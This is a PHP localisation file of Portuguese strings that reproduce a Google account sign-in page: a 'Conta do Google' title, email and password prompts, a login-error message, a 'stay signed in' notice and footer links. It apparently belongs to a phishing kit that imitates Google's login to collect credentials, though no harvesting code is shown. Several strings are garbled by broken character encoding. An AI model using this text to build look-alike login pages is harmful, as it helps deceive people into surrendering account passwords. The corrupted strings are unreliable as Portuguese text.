<?php
/*
------------------
Language: Portuguese
------------------
*/
 
$lang = array();
// Header 
$lang['TITTLE'] = 'Entrar - Conta do Google';
$lang['SIGN_IN'] = 'Entrar';
$lang['CONT_GMAIL'] = 'para continuar no Gmail';
$lang['PASSWORD'] = 'Senha';
$lang['EMAIL'] = 'Email ou telefone';
$lang['NEXT'] = 'Próxima';
$lang['SIGN'] = 'Entrar';
$lang['FORGOT'] = 'Esqueceu a senha?';
$lang['ERROR'] = 'nome de usuário e senha errada';

//Google Log in
$lang['ONE'] = 'Uma conta Todo o Google.';
$lang['SIGN_WITH'] = 'Entre com sua conta do Google';
$lang['STAY'] = 'Mantenha-se conectado';
$lang['KEEP_CHECKED'] = 'Para sua conveni��ncia, mantenha isso marcado. Em dispositivos compartilhados, precau�0�4�0�1es adicionais s�0�0o recomendadas.';
$lang['SIGN_DIFFERENT'] = 'entrar com uma conta diferente';
$lang['EVERYTHING'] = 'Uma Conta do Google para tudo o que o Google';
$lang['ABOUT'] = 'Sobre o Google';
$lang['PRIVACY'] = 'Privacidade';
$lang['TERM'] = 'condi�0�4�0�1es';
$lang['HELP'] = 'Socorro';
$lang['FIND_ACCOUNT'] = 'Encontrar Minha Conta';
$lang['CREATE'] = 'Criar Conta';
?>